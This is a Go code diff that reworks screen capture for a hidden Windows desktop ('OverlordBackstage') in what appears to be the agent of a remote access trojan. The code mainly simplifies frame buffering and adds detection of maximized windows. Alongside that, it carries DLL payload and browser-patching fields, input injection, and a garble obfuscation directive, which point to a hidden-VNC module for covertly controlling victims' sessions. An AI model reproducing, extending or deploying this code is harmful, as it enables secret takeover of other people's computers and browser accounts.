@@ -16,8 +16,6 @@ import (
 	"time"
 	"unicode/utf8"
 	"unsafe"
-
-	"overlord-client/cmd/agent/internal/overlordenv"
 )
 
 var (
@@ -31,6 +29,7 @@ var (
 	procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
 	procGetWindowRect            = user32.NewProc("GetWindowRect")
 	procIsWindowVisible          = user32.NewProc("IsWindowVisible")
+	procIsZoomed                 = user32.NewProc("IsZoomed")
 	procPrintWindow              = user32.NewProc("PrintWindow")
 	procGetWindow                = user32.NewProc("GetWindow")
 	procGetTopWindow             = user32.NewProc("GetTopWindow")
@@ -156,40 +155,41 @@ const (
 )
 
 var (
-	backstageDesktopHandle   uintptr
-	backstageDesktopMu       sync.Mutex
-	backstageCaptureMu       sync.Mutex
-	backstageDesktopName     = "OverlordBackstage"
-	backstageInitialized     bool
-	backstageOriginalDesktop uintptr
-	backstageCursorEnabled   bool
-	backstageThreadOnce      sync.Once
-	backstageThreadErr       error
-	backstageThreadReady     chan struct{}
-	backstageThreadTasks     chan backstageTask
-	backstageThreadDone      chan struct{}
-	backstageWatchdogOnce    sync.Once
-	backstageNoWindowLogNs   atomic.Int64
-	backstageInputMu         sync.Mutex
-	backstageLastCursor      point
-	backstageHasCursor       bool
-	backstageWorkingWindow   uintptr
-	backstageShiftDown       bool
-	backstageCtrlDown        bool
-	backstageAltDown         bool
-	backstageCapsLock        bool
-	backstageMovingWindow    bool
-	backstageMoveOffset      point
-	backstageWindowSize      point
-	backstageWindowToMove    uintptr
-	backstageMouseButtons    uint32
-	backstagePendingActivate uintptr
-	backstageExplorerStarted bool
-	backstageTaskSeq         atomic.Uint64
-	backstageCurrentTaskID   atomic.Uint64
-	backstageCurrentTaskKind atomic.Int64
-	backstageCurrentTaskNs   atomic.Int64
-	backstageLastScale       atomic.Uint64 // float64 bits — scale used by last backstage capture
+	backstageDesktopHandle     uintptr
+	backstageDesktopMu         sync.Mutex
+	backstageCaptureMu         sync.Mutex
+	backstageDesktopName       = "OverlordBackstage"
+	backstageInitialized       bool
+	backstageOriginalDesktop   uintptr
+	backstageCursorEnabled     bool
+	backstageThreadOnce        sync.Once
+	backstageThreadErr         error
+	backstageThreadReady       chan struct{}
+	backstageThreadTasks       chan backstageTask
+	backstageThreadDone        chan struct{}
+	backstageWatchdogOnce      sync.Once
+	backstageNoWindowLogNs     atomic.Int64
+	backstageZoomedBypassLogNs atomic.Int64
+	backstageInputMu           sync.Mutex
+	backstageLastCursor        point
+	backstageHasCursor         bool
+	backstageWorkingWindow     uintptr
+	backstageShiftDown         bool
+	backstageCtrlDown          bool
+	backstageAltDown           bool
+	backstageCapsLock          bool
+	backstageMovingWindow      bool
+	backstageMoveOffset        point
+	backstageWindowSize        point
+	backstageWindowToMove      uintptr
+	backstageMouseButtons      uint32
+	backstagePendingActivate   uintptr
+	backstageExplorerStarted   bool
+	backstageTaskSeq           atomic.Uint64
+	backstageCurrentTaskID     atomic.Uint64
+	backstageCurrentTaskKind   atomic.Int64
+	backstageCurrentTaskNs     atomic.Int64
+	backstageLastScale         atomic.Uint64 // float64 bits — scale used by last backstage capture
 
 	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
 	backstageWinCache      map[uintptr]*backstageWinCacheEntry
@@ -198,18 +198,11 @@ var (
 	backstageWinCacheSeq   uint64
 	backstageHungWindows   map[uintptr]struct{}
 
-	backstageCompHdcMem [2]uintptr
-	backstageCompHbmp   [2]uintptr
-	backstageCompBits   [2]unsafe.Pointer
+	backstageCompHdcMem uintptr
+	backstageCompHbmp   uintptr
+	backstageCompBits   unsafe.Pointer
 	backstageCompW      int
 	backstageCompH      int
-	backstageCompFlip   int
-	// Flip guards reset per capture by BackstageCaptureDisplayOnThread: each
-	// buffer set may alternate at most once per capture, otherwise a second
-	// staging/fallback attempt in the same capture would target the buffer the
-	// previous frame's encoder is still reading (torn composites).
-	backstageCompFlipUsed bool
-	backstageCapFlipUsed  bool
 
 	backstagePendingMouseMove *backstageTask
 	backstagePendingMoveMu    sync.Mutex
@@ -232,22 +225,22 @@ const (
 )
 
 type backstageTask struct {
-	kind            backstageTaskKind
-	id              uint64
-	display         int
-	filePath        string
-	x               int32
-	y               int32
-	button          int
-	vk              uint16
-	text            string
-	delta           int32
-	dllBytes        []byte
-	searchPath      string
-	replacePath     string
-	method          string
-	queuedAt        time.Time
-	resp            chan backstageTaskResult
+	kind        backstageTaskKind
+	id          uint64
+	display     int
+	filePath    string
+	x           int32
+	y           int32
+	button      int
+	vk          uint16
+	text        string
+	delta       int32
+	dllBytes    []byte
+	searchPath  string
+	replacePath string
+	method      string
+	queuedAt    time.Time
+	resp        chan backstageTaskResult
 }
 
 type backstageTaskResult struct {
@@ -294,24 +287,20 @@ type mouseInput struct {
 }
 
 type backstageWinCacheEntry struct {
-	hdcMem    uintptr
-	hbmp      uintptr
-	bits      unsafe.Pointer
-	w, h      int
-	bytes     int64
-	usedAt    uint64
-	lastOK    bool
-	attempted bool
-	age       int
+	hdcMem uintptr
+	hbmp   uintptr
+	bits   unsafe.Pointer
+	w, h   int
+	bytes  int64
+	usedAt uint64
+	lastOK bool
+	age    int
 }
 
 const (
-	backstageMaxWindowCacheEntries    = 64
-	backstageMaxWindowCacheBytes      = int64(256 << 20)
-	backstagePrintWindowTimeout       = 250 * time.Millisecond
-	backstagePrintWindowRetryTimeout  = 75 * time.Millisecond
-	backstagePrintWindowSlowThreshold = 60 * time.Millisecond
-	backstageFallbackFrameBudget      = 120 * time.Millisecond
+	backstageMaxWindowCacheEntries = 64
+	backstageMaxWindowCacheBytes   = int64(256 << 20)
+	backstagePrintWindowTimeout    = 250 * time.Millisecond
 )
 
 type keybdInput struct {
@@ -417,9 +406,17 @@ func CleanupbackstageDesktop() {
 	backstageClearWindowCache()
 	backstageWinCachePrev = nil
 
-	backstageFlushRetiredDIBs()
-
-	backstageFreeDWMCompCache()
+	if backstageCompHbmp != 0 {
+		deleteObject(backstageCompHbmp)
+		backstageCompHbmp = 0
+	}
+	if backstageCompHdcMem != 0 {
+		deleteDC(backstageCompHdcMem)
+		backstageCompHdcMem = 0
+	}
+	backstageCompBits = nil
+	backstageCompW = 0
+	backstageCompH = 0
 	backstageCaptureMu.Unlock()
 
 	backstageInputMu.Lock()
@@ -522,7 +519,7 @@ func ensurebackstageThread() error {
 
 	backstageThreadOnce.Do(func() {
 		ready := make(chan struct{})
-		tasks := make(chan backstageTask, 16)
+		tasks := make(chan backstageTask)
 		done := make(chan struct{})
 		backstageThreadReady = ready
 		backstageThreadTasks = tasks
@@ -616,57 +613,14 @@ func ensurebackstageThread() error {
 }
 
 func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
-	ticket, ok := requestBackstageCapture(display)
-	if !ok {
-		return nil, fmt.Errorf("backstage capture request failed")
-	}
-	return ticket.wait()
-}
-
-// backstageCaptureTicket is an in-flight capture request on the backstage
-// desktop thread. The stream loop issues the next frame's capture before
-// encoding the current one so capture and encode overlap (double-buffered
-// frame buffers make this safe).
-type backstageCaptureTicket struct {
-	resp chan backstageTaskResult
-}
-
-func requestBackstageCapture(display int) (backstageCaptureTicket, bool) {
 	if err := ensurebackstageThread(); err != nil {
-		return backstageCaptureTicket{}, false
+		return nil, err
 	}
-	if backstageThreadTasks == nil {
-		return backstageCaptureTicket{}, false
-	}
-	resp := make(chan backstageTaskResult, 1)
-	task := backstageTask{kind: backstageTaskCapture, display: display, resp: resp, queuedAt: time.Now()}
-	timer := time.NewTimer(3 * time.Second)
-	defer timer.Stop()
-	select {
-	case backstageThreadTasks <- task:
-		return backstageCaptureTicket{resp: resp}, true
-	case <-backstageThreadDone:
-		return backstageCaptureTicket{}, false
-	case <-timer.C:
-		log.Printf("backstage capture: task enqueue timeout")
-		return backstageCaptureTicket{}, false
-	}
-}
 
-func (t backstageCaptureTicket) wait() (*image.RGBA, error) {
-	if t.resp == nil {
-		return nil, fmt.Errorf("no backstage capture in flight")
-	}
-	timer := time.NewTimer(5 * time.Second)
-	defer timer.Stop()
-	select {
-	case result := <-t.resp:
-		return result.img, result.err
-	case <-backstageThreadDone:
-		return nil, fmt.Errorf("backstage thread stopped during capture")
-	case <-timer.C:
-		return nil, fmt.Errorf("backstage capture timed out")
-	}
+	resp := make(chan backstageTaskResult, 1)
+	backstageThreadTasks <- backstageTask{kind: backstageTaskCapture, display: display, resp: resp}
+	result := <-resp
+	return result.img, result.err
 }
 
 func StartbackstageProcess(filePath string, operaPatch bool, display int) error {
@@ -905,84 +859,55 @@ func backstageTaskDetails(task backstageTask) string {
 
 var (
 	backstageCapHDCScreen uintptr
-	backstageCapHDCMem    [2]uintptr
-	backstageCapHBMP      [2]uintptr
-	backstageCapBits      [2]unsafe.Pointer
+	backstageCapHDCMem    uintptr
+	backstageCapHBMP      uintptr
+	backstageCapBits      unsafe.Pointer
 	backstageCapW         int
 	backstageCapH         int
-	backstageCapFlip      int
+	backstageCapImg       *image.RGBA
 )
 
-// Retired DIB pairs are freed at desktop cleanup instead of at recreation:
-// borrowed frames returned to the encoder may still reference their memory.
-type backstageDIBPair struct {
-	hdcMem uintptr
-	hbmp   uintptr
-}
-
-var backstageRetiredDIBs []backstageDIBPair
-
-func backstageRetireDIBPair(hdcMem, hbmp uintptr) {
-	backstageRetiredDIBs = append(backstageRetiredDIBs, backstageDIBPair{hdcMem: hdcMem, hbmp: hbmp})
-}
-
-func backstageFlushRetiredDIBs() {
-	for _, pair := range backstageRetiredDIBs {
-		if pair.hbmp != 0 {
-			deleteObject(pair.hbmp)
-		}
-		if pair.hdcMem != 0 {
-			deleteDC(pair.hdcMem)
-		}
-	}
-	backstageRetiredDIBs = nil
-}
-
 func backstageFreeCapCache() {
-	for idx := 0; idx < 2; idx++ {
-		if backstageCapHBMP[idx] != 0 {
-			deleteObject(backstageCapHBMP[idx])
-			backstageCapHBMP[idx] = 0
-		}
-		if backstageCapHDCMem[idx] != 0 {
-			deleteDC(backstageCapHDCMem[idx])
-			backstageCapHDCMem[idx] = 0
-		}
-		backstageCapBits[idx] = nil
+	if backstageCapHBMP != 0 {
+		deleteObject(backstageCapHBMP)
+		backstageCapHBMP = 0
+	}
+	if backstageCapHDCMem != 0 {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
 	}
 	if backstageCapHDCScreen != 0 {
 		releaseDC(0, backstageCapHDCScreen)
 		backstageCapHDCScreen = 0
 	}
+	backstageCapBits = nil
 	backstageCapW = 0
 	backstageCapH = 0
-	backstageCapFlip = 0
+	backstageCapImg = nil
 }
 
-func backstageEnsureCapCache(w, h int) (uintptr, []byte, bool) {
+func backstageEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
 	if backstageCapHDCScreen == 0 {
 		backstageCapHDCScreen = getDC(0)
 		if backstageCapHDCScreen == 0 {
-			return 0, nil, false
+			return 0, 0, nil, false
 		}
 	}
-	if backstageCapHDCMem[0] != 0 && backstageCapHDCMem[1] != 0 &&
-		backstageCapW == w && backstageCapH == h &&
-		backstageCapBits[0] != nil && backstageCapBits[1] != nil {
-		if !backstageCapFlipUsed {
-			backstageCapFlip ^= 1
-			backstageCapFlipUsed = true
-		}
-		idx := backstageCapFlip
-		return backstageCapHDCScreen, unsafe.Slice((*byte)(backstageCapBits[idx]), w*h*4), true
+	if backstageCapHDCMem != 0 && backstageCapW == w && backstageCapH == h && backstageCapBits != nil {
+		buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
+		return backstageCapHDCScreen, backstageCapHDCMem, buf, true
 	}
-	for idx := 0; idx < 2; idx++ {
-		if backstageCapHDCMem[idx] != 0 || backstageCapHBMP[idx] != 0 {
-			backstageRetireDIBPair(backstageCapHDCMem[idx], backstageCapHBMP[idx])
-		}
-		backstageCapHBMP[idx] = 0
-		backstageCapHDCMem[idx] = 0
-		backstageCapBits[idx] = nil
+	if backstageCapHBMP != 0 {
+		deleteObject(backstageCapHBMP)
+		backstageCapHBMP = 0
+	}
+	if backstageCapHDCMem != 0 {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
+	}
+	backstageCapHDCMem = createCompatibleDC(backstageCapHDCScreen)
+	if backstageCapHDCMem == 0 {
+		return 0, 0, nil, false
 	}
 	bmi := bitmapInfo{
 		bmiHeader: bitmapInfoHeader{
@@ -994,110 +919,24 @@ func backstageEnsureCapCache(w, h int) (uintptr, []byte, bool) {
 			biCompression: BI_RGB,
 		},
 	}
-	for idx := 0; idx < 2; idx++ {
-		backstageCapHDCMem[idx] = createCompatibleDC(backstageCapHDCScreen)
-		if backstageCapHDCMem[idx] == 0 {
-			backstageFreeCapCache()
-			return 0, nil, false
-		}
-		backstageCapHBMP[idx] = createDIBSection(backstageCapHDCMem[idx], &bmi, DIB_RGB_COLORS, &backstageCapBits[idx])
-		if backstageCapHBMP[idx] == 0 || backstageCapBits[idx] == nil {
-			backstageFreeCapCache()
-			return 0, nil, false
-		}
-		selectObject(backstageCapHDCMem[idx], backstageCapHBMP[idx])
+	backstageCapHBMP = createDIBSection(backstageCapHDCMem, &bmi, DIB_RGB_COLORS, &backstageCapBits)
+	if backstageCapHBMP == 0 || backstageCapBits == nil {
+		deleteDC(backstageCapHDCMem)
+		backstageCapHDCMem = 0
+		return 0, 0, nil, false
 	}
+	selectObject(backstageCapHDCMem, backstageCapHBMP)
 	backstageCapW = w
 	backstageCapH = h
-	backstageCapFlip = 0
-	backstageCapFlipUsed = true
-	return backstageCapHDCScreen, unsafe.Slice((*byte)(backstageCapBits[0]), w*h*4), true
-}
-
-var backstageDWMStagingDisabledOnce sync.Once
-var backstageDWMStagingDisabledValue bool
-
-func backstageDWMStagingDisabled() bool {
-	backstageDWMStagingDisabledOnce.Do(func() {
-		switch strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_BACKSTAGE_DISABLE_DWM"))) {
-		case "1", "true", "yes", "on":
-			backstageDWMStagingDisabledValue = true
-		}
-	})
-	return backstageDWMStagingDisabledValue
-}
-
-var (
-	backstageStagingStickyUntilNs atomic.Int64
-	backstagePerWindowAvgNs       atomic.Int64
-	backstageStagingAvgNs         atomic.Int64
-	backstagePerWindowProbeNs     atomic.Int64
-)
-
-// The DWM thumbnail staging readback (full-screen PrintWindow) is correct for
-// every window but costs tens of milliseconds per frame; per-window
-// PrintWindow can be much cheaper but fails for some (GPU-rendered) windows
-// and can be slower for others. Prefer per-window capture, engage staging
-// when some window cannot be drawn, and pick whichever strategy has been
-// measured faster, probing the loser every few seconds.
-func backstageStagingSticky() bool {
-	return time.Now().UnixNano() < backstageStagingStickyUntilNs.Load()
-}
-
-func backstageNoteStagingNeeded() {
-	backstageStagingStickyUntilNs.Store(time.Now().Add(3 * time.Second).UnixNano())
-}
-
-func backstageNoteCaptureCost(perWindow bool, d time.Duration) {
-	target := &backstageStagingAvgNs
-	if perWindow {
-		target = &backstagePerWindowAvgNs
-	}
-	for {
-		cur := target.Load()
-		next := d.Nanoseconds()
-		if cur > 0 {
-			next = cur*4/5 + next/5
-		}
-		if target.CompareAndSwap(cur, next) {
-			return
-		}
-	}
-}
-
-// backstagePreferPerWindow decides the capture strategy for this frame.
-func backstagePreferPerWindow(fallbackEnabled, stagingDisabled bool, now time.Time) bool {
-	if !fallbackEnabled || stagingDisabled {
-		return false
-	}
-	if backstageStagingSticky() {
-		return false
-	}
-	pwAvg := backstagePerWindowAvgNs.Load()
-	stAvg := backstageStagingAvgNs.Load()
-	if pwAvg > int64(33*time.Millisecond) && stAvg == 0 {
-		// Per-window capture is slow and staging has never been sampled;
-		// take one staging frame to learn its cost.
-		return false
-	}
-	if pwAvg > 0 && stAvg > 0 && pwAvg > stAvg+stAvg/4 {
-		// Per-window measured clearly slower; stick with staging but probe
-		// per-window capture every few seconds in case conditions changed.
-		last := backstagePerWindowProbeNs.Load()
-		if now.UnixNano()-last < int64(3*time.Second) ||
-			!backstagePerWindowProbeNs.CompareAndSwap(last, now.UnixNano()) {
-			return false
-		}
-	}
-	return true
+	backstageCapImg = nil
+	buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
+	return backstageCapHDCScreen, backstageCapHDCMem, buf, true
 }
 
 func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	backstageCaptureMu.Lock()
 	defer backstageCaptureMu.Unlock()
-	backstageCompFlipUsed = false
-	backstageCapFlipUsed = false
 
 	setDPIAware()
 
@@ -1127,44 +966,30 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 		dstH = srcH
 	}
 
-	stagingDisabled := backstageDWMStagingDisabled()
-	fallbackEnabled := backstagePrintWindowFallbackEnabled.Load()
-
-	tryStaging := func() (*image.RGBA, bool) {
-		if stagingDisabled {
-			return nil, false
-		}
-		stagingStart := time.Now()
+	if !backstageHasZoomedVisibleWindow(bounds) {
 		if dwmHDC, dwmBuf, ok := backstageEnsureDWMCompCache(dstW, dstH); ok {
+			for i := range dwmBuf {
+				dwmBuf[i] = 0
+			}
 			if drawbackstageStagingFromDWM(dwmHDC, bounds, dstW, dstH, dwmBuf) {
 				swapRB(dwmBuf)
-				backstageNoteCaptureCost(false, time.Since(stagingStart))
-				return newBorrowedRGBA(dwmBuf, dstW, dstH), true
+				img := GetRGBA(dstW, dstH)
+				copy(img.Pix, dwmBuf)
+				return img, nil
 			}
 		}
-		return nil, false
-	}
-
-	if !backstagePreferPerWindow(fallbackEnabled, stagingDisabled, time.Now()) {
-		if img, ok := tryStaging(); ok {
-			return img, nil
-		}
-		if !fallbackEnabled {
-			// Staging failed and per-window capture is disabled: black frame.
-			if _, buf, ok := backstageEnsureCapCache(srcW, srcH); ok {
-				for i := range buf {
-					buf[i] = 0
-				}
-				return newBorrowedRGBA(buf, srcW, srcH), nil
-			}
-			return nil, syscall.EINVAL
+	} else {
+		now := time.Now().UnixNano()
+		last := backstageZoomedBypassLogNs.Load()
+		if now-last > int64(5*time.Second) && backstageZoomedBypassLogNs.CompareAndSwap(last, now) {
+			log.Printf("backstage capture: maximized window present; using per-window composite (dwm thumbnails hide the non-client area of maximized windows)")
 		}
 	}
 
 	capW := srcW
 	capH := srcH
 
-	hdcScreen, buf, ok := backstageEnsureCapCache(capW, capH)
+	hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
 	if !ok {
 		return nil, syscall.EINVAL
 	}
@@ -1173,9 +998,7 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 		buf[i] = 0
 	}
 
-	pwStart := time.Now()
-	drawn, failed := drawbackstageWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
-	pwDur := time.Since(pwStart)
+	drawn := drawbackstageWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
 	if drawn == 0 {
 		now := time.Now().UnixNano()
 		last := backstageNoWindowLogNs.Load()
@@ -1184,22 +1007,19 @@ func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 		}
 	}
 
-	if failed > 0 {
-		if img, ok := tryStaging(); ok {
-			backstageNoteStagingNeeded()
-			return img, nil
-		}
-	}
-	backstageNoteCaptureCost(true, pwDur)
-
 	swapRB(buf)
 
-	img := newBorrowedRGBA(buf, capW, capH)
+	img := backstageCapImg
+	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
+		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
+		backstageCapImg = img
+	}
+	copy(img.Pix, buf)
+
+	_ = hdcMem
 
 	if dstW != capW || dstH != capH {
-		scaled := resizeNearest(img, dstW, dstH)
-		releaseBackstageFrame(img)
-		img = scaled
+		img = resizeNearest(img, dstW, dstH)
 	}
 
 	return img, nil
@@ -1914,6 +1734,30 @@ func BackstageMonitorCount() int {
 	return displayCount()
 }
 
+// backstageHasZoomedVisibleWindow reports whether any visible top-level window
+// intersecting bounds is maximized. DWM thumbnails of maximized windows render
+// only the client area (non-client title bar buttons vanish from the stream),
+// so the staging composite must be bypassed whenever one is present.
+func backstageHasZoomedVisibleWindow(bounds image.Rectangle) bool {
+	hwnd := getTopWindow(0)
+	if hwnd != 0 {
+		hwnd = getWindow(hwnd, GW_HWNDLAST)
+	}
+	for hwnd != 0 {
+		if !backstageIsDWMHost(hwnd) && isWindowVisible(hwnd) {
+			if z, _, _ := procIsZoomed.Call(hwnd); z != 0 {
+				var windowRect rect
+				ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&windowRect)))
+				if ok != 0 && rectIntersectsImage(windowRect, bounds) {
+					return true
+				}
+			}
+		}
+		hwnd = getWindow(hwnd, GW_HWNDPREV)
+	}
+	return false
+}
+
 func backstageResolveCaptureBounds(display int) (image.Rectangle, string) {
 	mons := monitorList()
 	if display >= 0 && display < len(mons) {
@@ -1936,14 +1780,14 @@ func backstageResolveCaptureBounds(display int) (image.Rectangle, string) {
 	return image.Rectangle{}, "unknown"
 }
 
-func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) (drawn, failed int) {
+func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
 	hwnd := getTopWindow(0)
 	if hwnd == 0 {
-		return 0, 0
+		return 0
 	}
 	hwnd = getWindow(hwnd, GW_HWNDLAST)
 	if hwnd == 0 {
-		return 0, 0
+		return 0
 	}
 
 	// Initialize cache if needed
@@ -1954,24 +1798,10 @@ func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, tar
 	// Track which windows are still alive this frame
 	alive := make(map[uintptr]bool)
 
-	started := time.Now()
+	drawn := 0
 	for hwnd != 0 {
-		if time.Since(started) > backstageFallbackFrameBudget {
-			n := time.Now().UnixNano()
-			last := backstageFallbackBudgetLogNs.Load()
-			if n-last > int64(5*time.Second) && backstageFallbackBudgetLogNs.CompareAndSwap(last, n) {
-				log.Printf("backstage capture: fallback frame budget %s exhausted; skipping remaining windows this frame", backstageFallbackFrameBudget)
-			}
-			failed++
-			break
-		}
-		if !backstageIsDWMHost(hwnd) {
-			switch drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
-			case backstageDrawOK:
-				drawn++
-			case backstageDrawFailed:
-				failed++
-			}
+		if !backstageIsDWMHost(hwnd) && drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
+			drawn++
 		}
 		alive[hwnd] = true
 		hwnd = getWindow(hwnd, GW_HWNDPREV)
@@ -1989,7 +1819,7 @@ func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, tar
 		}
 	}
 
-	return drawn, failed
+	return drawn
 }
 
 func backstageGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *backstageWinCacheEntry {
@@ -2112,7 +1942,6 @@ var backstageUIAEnabled atomic.Bool
 var backstagePrintWindowFallbackEnabled atomic.Bool
 var backstagePrintWindowFallbackLogNs atomic.Int64
 var backstagePrintWindowTimeoutLogNs atomic.Int64
-var backstageFallbackBudgetLogNs atomic.Int64
 var backstagePrintWindowFn = printWindow
 
 func init() {
@@ -2151,12 +1980,6 @@ func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry
 		return false
 	}
 
-	timeout := backstagePrintWindowTimeout
-	if entry.attempted && !entry.lastOK {
-		timeout = backstagePrintWindowRetryTimeout
-	}
-	entry.attempted = true
-
 	var ownership atomic.Int32 // 0=racing, 1=caller keeps cache, 2=worker frees detached cache
 	done := make(chan bool, 1)
 	go func() {
@@ -2172,20 +1995,10 @@ func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry
 		backstageFreeCacheEntry(entry)
 	}()
 
-	timer := time.NewTimer(timeout)
+	timer := time.NewTimer(backstagePrintWindowTimeout)
 	defer timer.Stop()
-	started := time.Now()
 	select {
 	case ok := <-done:
-		if ok {
-			if elapsed := time.Since(started); elapsed > backstagePrintWindowSlowThreshold {
-				now := time.Now().UnixNano()
-				last := backstagePrintWindowTimeoutLogNs.Load()
-				if now-last > int64(5*time.Second) && backstagePrintWindowTimeoutLogNs.CompareAndSwap(last, now) {
-					log.Printf("backstage capture: PrintWindow slow (%s) for hwnd=0x%x", elapsed.Round(time.Millisecond), hwnd)
-				}
-			}
-		}
 		return ok
 	case <-timer.C:
 		if !ownership.CompareAndSwap(0, 2) {
@@ -2202,41 +2015,33 @@ func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry
 	}
 }
 
-type backstageDrawResult int
-
-const (
-	backstageDrawSkipped backstageDrawResult = iota // not visible / out of bounds: not a failure
-	backstageDrawOK
-	backstageDrawFailed // visible window that could not be rendered
-)
-
-func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) backstageDrawResult {
+func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
 	if backstageIsDWMHost(hwnd) {
-		return backstageDrawSkipped
+		return false
 	}
 	if !isWindowVisible(hwnd) {
-		return backstageDrawSkipped
+		return false
 	}
 	var r rect
 	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
 	if ok == 0 {
-		return backstageDrawSkipped
+		return false
 	}
 	winLeft := int(r.left)
 	winTop := int(r.top)
 	winRight := int(r.right)
 	winBottom := int(r.bottom)
 	if winRight <= winLeft || winBottom <= winTop {
-		return backstageDrawSkipped
+		return false
 	}
 	if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
-		return backstageDrawSkipped
+		return false
 	}
 
 	winW := winRight - winLeft
 	winH := winBottom - winTop
 	if winW <= 0 || winH <= 0 {
-		return backstageDrawSkipped
+		return false
 	}
 
 	if !backstagePrintWindowFallbackEnabled.Load() {
@@ -2246,31 +2051,93 @@ func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target
 			backstagePrintWindowFallbackLogNs.CompareAndSwap(last, now) {
 			log.Printf("backstage capture: per-window PrintWindow fallback is disabled")
 		}
-		return backstageDrawFailed
+		return false
 	}
 
 	// Use pooled DC+DIB from cache
 	entry := backstageGetOrCreateCache(hdcScreen, hwnd, winW, winH)
 	if entry == nil {
-		return backstageDrawFailed
+		return false
 	}
 
 	if !backstagePrintWindowWithTimeout(hwnd, entry) {
 		if backstageWinCache[hwnd] != entry {
-			return backstageDrawFailed
+			return false
 		}
 		entry.lastOK = false
 		entry.age++
-		return backstageDrawFailed
+		return false
 	}
 	entry.lastOK = true
 
 	buf := unsafe.Slice((*byte)(entry.bits), winW*winH*4)
 	winStride := winW * 4
 
-	effTop, effLeft, effBottom, effRight, found := backstageContentBounds(buf, winStride, winW, winH)
-	if !found {
-		return backstageDrawFailed
+	effTop, effLeft, effBottom, effRight := 0, 0, winH, winW
+
+	topFound := false
+	for y := 0; y < winH; y++ {
+		rowBase := y * winStride
+		for x := 0; x < winW; x++ {
+			off := rowBase + x*4
+			if buf[off]|buf[off+1]|buf[off+2] != 0 {
+				effTop = y
+				topFound = true
+				break
+			}
+		}
+		if topFound {
+			break
+		}
+	}
+	if !topFound {
+		return false
+	}
+
+	for y := winH - 1; y > effTop; y-- {
+		rowBase := y * winStride
+		found := false
+		for x := 0; x < winW; x++ {
+			off := rowBase + x*4
+			if buf[off]|buf[off+1]|buf[off+2] != 0 {
+				found = true
+				break
+			}
+		}
+		if found {
+			effBottom = y + 1
+			break
+		}
+	}
+
+	leftFound := false
+	for x := 0; x < winW; x++ {
+		for y := effTop; y < effBottom; y++ {
+			off := y*winStride + x*4
+			if buf[off]|buf[off+1]|buf[off+2] != 0 {
+				effLeft = x
+				leftFound = true
+				break
+			}
+		}
+		if leftFound {
+			break
+		}
+	}
+
+	for x := winW - 1; x > effLeft; x-- {
+		found := false
+		for y := effTop; y < effBottom; y++ {
+			off := y*winStride + x*4
+			if buf[off]|buf[off+1]|buf[off+2] != 0 {
+				found = true
+				break
+			}
+		}
+		if found {
+			effRight = x + 1
+			break
+		}
 	}
 
 	effWinLeft := winLeft + effLeft
@@ -2283,7 +2150,7 @@ func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target
 	interRight := minInt(effWinRight, bounds.Max.X)
 	interBottom := minInt(effWinBottom, bounds.Max.Y)
 	if interRight <= interLeft || interBottom <= interTop {
-		return backstageDrawSkipped
+		return false
 	}
 
 	srcX := interLeft - winLeft
@@ -2299,46 +2166,7 @@ func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target
 		copy(target[dstStart:dstStart+copyW*4], buf[srcStart:srcStart+copyW*4])
 	}
 
-	return backstageDrawOK
-}
-
-// backstageContentBounds finds the tightest box containing non-black pixels in
-// a single pass over the buffer (the previous implementation scanned up to four
-// times: top, bottom, left, right).
-func backstageContentBounds(buf []byte, stride, w, h int) (top, left, bottom, right int, ok bool) {
-	top, left, bottom, right = h, w, 0, 0
-	found := false
-	for y := 0; y < h; y++ {
-		row := buf[y*stride : y*stride+w*4]
-		words := unsafe.Slice((*uint32)(unsafe.Pointer(&row[0])), w)
-		rowLeft, rowRight := -1, -1
-		for x := 0; x < w; x++ {
-			if words[x]&0x00FFFFFF != 0 {
-				if rowLeft < 0 {
-					rowLeft = x
-				}
-				rowRight = x
-			}
-		}
-		if rowLeft < 0 {
-			continue
-		}
-		found = true
-		if y < top {
-			top = y
-		}
-		bottom = y + 1
-		if rowLeft < left {
-			left = rowLeft
-		}
-		if rowRight+1 > right {
-			right = rowRight + 1
-		}
-	}
-	if !found {
-		return 0, 0, 0, 0, false
-	}
-	return top, left, bottom, right, true
+	return true
 }
 
 func maxInt(a, b int) int {
